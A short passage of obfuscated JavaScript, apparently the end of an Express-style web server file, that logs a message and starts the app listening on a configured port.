_0x4f7353=_0x1b9873;console[_0x4f7353(0x26a)](_0x4f7353(0x24f),_0x422ade);}),app['listen'](PORT,()=>console[_0x1b9873(0x2a5)](_0x1b9873(0x233)+PORT+'!'));
